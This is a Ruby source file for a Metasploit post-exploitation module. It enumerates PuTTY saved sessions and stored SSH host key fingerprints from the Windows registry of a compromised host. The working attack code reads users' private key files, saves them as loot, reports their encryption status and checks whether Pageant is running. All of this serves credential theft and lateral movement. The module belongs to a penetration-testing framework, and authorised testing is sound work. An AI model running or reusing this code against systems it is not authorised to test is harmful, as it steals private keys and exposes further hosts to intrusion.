##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core/post/windows/priv'
require 'msf/core/post/common'
require 'msf/core/post/windows/registry'

class MetasploitModule < Msf::Post
  include Msf::Post::Windows::Priv
  include Msf::Post::Common
  include Msf::Post::File
  include Msf::Post::Windows::Registry

  INTERESTING_KEYS = ['HostName', 'UserName', 'PublicKeyFile', 'PortNumber', 'PortForwardings']
  PAGEANT_REGISTRY_KEY = "HKCU\\Software\\SimonTatham\\PuTTY"
  PUTTY_PRIVATE_KEY_ANALYSIS = ['Name', 'HostName', 'UserName', 'PublicKeyFile', 'Type', 'Cipher', 'Comment']

  def initialize(info = {})
    super(update_info(info,
                      'Name'            => "PuTTY Saved Sessions Enumeration Module",
                      'Description'     => %q{
                        This module will identify whether Pageant (PuTTY Agent) is running and obtain saved session
                        information from the registry. PuTTY is very configurable; some users may have configured
                        saved sessions which could include a username, private key file to use when authenticating,
                        host name etc.  If a private key is configured, an attempt will be made to download and store
                        it in loot. It will also record the SSH host keys which have been stored. These will be connections that
                        the user has previously after accepting the host SSH fingerprint and therefore are of particular
                        interest if they are within scope of a penetration test.
                       },
                      'License'         => MSF_LICENSE,
                      'Platform'        => ['win'],
                      'SessionTypes'    => ['meterpreter'],
                      'Author'          => ['Stuart Morgan <stuart.morgan[at]mwrinfosecurity.com>']
                     ))
  end

  def get_saved_session_details(sessions)
    all_sessions = []
    sessions.each do |ses|
      newses = {}
      newses['Name'] = Rex::Text.uri_decode(ses)
      INTERESTING_KEYS.each do |key|
        newses[key] = registry_getvaldata("#{PAGEANT_REGISTRY_KEY}\\Sessions\\#{ses}", key).to_s
      end
      all_sessions << newses
      report_note(host: target_host, type: "putty.savedsession", data: newses, update: :unique_data)
    end
    all_sessions
  end

  def display_saved_sessions_report(info)
    # Results table holds raw string data
    results_table = Rex::Text::Table.new(
      'Header'     => "PuTTY Saved Sessions",
      'Indent'     => 1,
      'SortIndex'  => -1,
      'Columns'    => ['Name'].append(INTERESTING_KEYS).flatten
    )

    info.each do |result|
      row = []
      row << result['Name']
      INTERESTING_KEYS.each do |key|
        row << result[key]
      end
      results_table << row
    end

    print_line
    print_line results_table.to_s
    stored_path = store_loot('putty.sessions.csv', 'text/csv', session, results_table.to_csv, nil, "PuTTY Saved Sessions List")
    print_good("PuTTY saved sessions list saved to #{stored_path} in CSV format & available in notes (use 'notes -t putty.savedsession' to view).")
  end

  def display_private_key_analysis(info)
    # Results table holds raw string data
    results_table = Rex::Text::Table.new(
      'Header'     => "PuTTY Private Keys",
      'Indent'     => 1,
      'SortIndex'  => -1,
      'Columns'    => PUTTY_PRIVATE_KEY_ANALYSIS
    )

    info.each do |result|
      row = []
      PUTTY_PRIVATE_KEY_ANALYSIS.each do |key|
        row << result[key]
      end
      results_table << row
    end

    print_line
    print_line results_table.to_s
    # stored_path = store_loot('putty.sessions.csv', 'text/csv', session, results_table.to_csv, nil, "PuTTY Saved Sessions List")
    # print_good("PuTTY saved sessions list saved to #{stored_path} in CSV format & available in notes (use 'notes -t putty.savedsession' to view).")
  end

  def get_stored_host_key_details(allkeys)
    # This hash will store (as the key) host:port pairs. This is basically a quick way of
    # getting a unique list of host:port pairs.
    all_ssh_host_keys = {}

    # This regex will split up lines such as rsa2@22:127.0.0.1 from the registry.
    rx_split_hostporttype = /^(?<type>[-a-z0-9]+?)@(?<port>[0-9]+?):(?<host>.+)$/i

    # Go through each of the stored keys found in the registry
    allkeys.each do |key|
      # Store the raw key and value in a hash to start off with
      newkey = {
        rawname: key,
        rawsig: registry_getvaldata("#{PAGEANT_REGISTRY_KEY}\\SshHostKeys", key).to_s
      }

      # Take the key and split up host, port and fingerprint type. If it matches, store the information
      # in the hash for later.
      split_hostporttype = rx_split_hostporttype.match(key.to_s)
      if split_hostporttype

        # Extract the host, port and key type into the hash
        newkey['host'] = split_hostporttype[:host]
        newkey['port'] = split_hostporttype[:port]
        newkey['type'] = split_hostporttype[:type]

        # Form the key
        host_port = "#{newkey['host']}:#{newkey['port']}"

        # Add it to the consolidation hash. If the same IP has different key types, append to the array
        all_ssh_host_keys[host_port] = [] if all_ssh_host_keys[host_port].nil?
        all_ssh_host_keys[host_port] << newkey['type']
      end
      report_note(host: target_host, type: "putty.storedfingerprint", data: newkey, update: :unique_data)
    end
    all_ssh_host_keys
  end

  def display_stored_host_keys_report(info)
    # Results table holds raw string data
    results_table = Rex::Text::Table.new(
      'Header'     => "Stored SSH host key fingerprints",
      'Indent'     => 1,
      'SortIndex'  => -1,
      'Columns'    => ['SSH Endpoint', 'Key Type(s)']
    )

    info.each do |key, result|
      row = []
      row << key
      row << result.join(', ')
      results_table << row
    end

    print_line
    print_line results_table.to_s
    stored_path = store_loot('putty.storedfingerprints.csv', 'text/csv', session, results_table.to_csv, nil, "PuTTY Stored SSH Host Keys List")
    print_good("PuTTY stored host keys list saved to #{stored_path} in CSV format & available in notes (use 'notes -t putty.storedfingerprint' to view).")
  end

  def grab_private_keys(sessions)
    private_key_summary = []
    sessions.each do |ses|
      filename = ses['PublicKeyFile'].to_s
      next if filename.empty?

      # Check whether the file exists.
      if file?(filename)
        ppk = read_file(filename)
        if ppk # Attempt to read the contents of the file
          stored_path = store_loot('putty.ppk.file', 'application/octet-stream', session, ppk)
          print_good("PuTTY private key file for \'#{ses['Name']}\' (#{filename}) saved to: #{stored_path}")

          # Now analyse the private key
          private_key = {}
          private_key['Name'] = ses['Name']
          private_key['UserName'] = ses['UserName']
          private_key['HostName'] = ses['HostName']
          private_key['PublicKeyFile'] = ses['PublicKeyFile']
          private_key['Type'] = ''
          private_key['Cipher'] = ''
          private_key['Comment'] = ''

          # Get type of key
          if ppk.to_s =~ /^SSH PRIVATE KEY FILE FORMAT 1.1/
            # This is an SSH1 header
            private_key['Type'] = 'ssh1'
            private_key['Comment'] = '-'
            if ppk[33] == "\x00"
              private_key['Cipher'] = 'none'
            elsif ppk[33] == "\x03"
              private_key['Cipher'] = '3DES'
            else
              private_key['Cipher'] = '(Unrecognised)'
            end
          elsif rx = /^PuTTY-User-Key-File-2:\sssh-(?<keytype>rsa|dss)[\r\n]/.match(ppk.to_s)
            # This is an SSH2 header
            private_key['Type'] = "ssh2 (#{rx[:keytype]})"
            if rx = /^Encryption:\s(?<cipher>[-a-z0-9]+?)[\r\n]/.match(ppk.to_s)
              private_key['Cipher'] = rx[:cipher]
            else
              private_key['Cipher'] = '(Unrecognised)'
            end

            if rx = /^Comment:\s(?<comment>.+?)[\r\n]/.match(ppk.to_s)
              private_key['Comment'] = rx[:comment]
            end
          end
          private_key_summary << private_key
        else
          print_error("Unable to read PuTTY private key file for \'#{ses['Name']}\' (#{filename})") # May be that we do not have permissions etc
        end
      else
        print_error("PuTTY private key file for \'#{ses['Name']}\' (#{filename}) could not be read.")
      end
    end
    private_key_summary
  end

  # Entry point
  def run
    # Look for saved sessions, break out if not.
    print_status("Looking for saved PuTTY sessions")
    saved_sessions = registry_enumkeys("#{PAGEANT_REGISTRY_KEY}\\Sessions")
    if saved_sessions.nil? || saved_sessions.empty?
      print_error('No saved sessions found')
    else

      # Tell the user how many sessions have been found (with correct English)
      print_status("Found #{saved_sessions.count} session#{saved_sessions.count > 1 ? 's' : ''}")

      # Retrieve the saved session details & print them to the screen in a report
      all_saved_sessions = get_saved_session_details(saved_sessions)
      display_saved_sessions_report(all_saved_sessions)

      # If the private key file has been configured, retrieve it and save it to loot
      print_status("Downloading private keys...")
      private_key_info = grab_private_keys(all_saved_sessions)
      if !private_key_info.nil? && !private_key_info.empty?
        print_line
        display_private_key_analysis(private_key_info)
      end
    end

    print_line # Just for readability

    # Now search for SSH stored keys. These could be useful because it shows hosts that the user
    # has previously connected to and accepted a key from.
    print_status("Looking for previously stored SSH host key fingerprints")
    stored_ssh_host_keys = registry_enumvals("#{PAGEANT_REGISTRY_KEY}\\SshHostKeys")
    if stored_ssh_host_keys.nil? || stored_ssh_host_keys.empty?
      print_error('No stored SSH host keys found')
    else
      # Tell the user how many sessions have been found (with correct English)
      print_status("Found #{stored_ssh_host_keys.count} stored key fingerprint#{stored_ssh_host_keys.count > 1 ? 's' : ''}")

      # Retrieve the saved session details & print them to the screen in a report
      print_status("Downloading stored key fingerprints...")
      all_stored_keys = get_stored_host_key_details(stored_ssh_host_keys)
      if all_stored_keys.nil? || all_stored_keys.empty?
        print_error("No stored key fingerprints found")
      else
        display_stored_host_keys_report(all_stored_keys)
      end
    end

    print_line # Just for readability

    print_status("Looking for Pageant...")
    hwnd = client.railgun.user32.FindWindowW("Pageant", "Pageant")
    if hwnd['return']
      print_good("Pageant is running (Handle 0x#{sprintf('%x', hwnd['return'])})")
    else
      print_error("Pageant is not running")
    end
  end
end
